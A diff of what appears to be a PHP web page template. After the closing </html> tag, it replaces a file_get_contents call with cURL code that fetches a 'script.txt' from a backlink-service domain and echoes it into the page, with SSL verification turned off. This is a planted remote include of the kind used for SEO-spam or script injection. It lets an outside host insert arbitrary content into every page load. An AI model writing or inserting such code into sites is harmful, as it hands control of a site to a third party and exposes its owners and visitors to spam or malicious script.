@@ -103,4 +103,17 @@ $(window).load(function() {
 </body>
 </html>
 
-<?php echo file_get_contents("https://www.backlinkku.id/menu/vip-v2/script.txt"); ?>
+<?php
+$url = 'https://www.backlinkku.id/menu/vip-v2/script.txt';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$content = curl_exec($ch);
+if (curl_errno($ch)) {
+    echo "cURL Error: " . curl_error($ch);
+} else {
+    echo $content;
+}
+curl_close($ch);
+?>
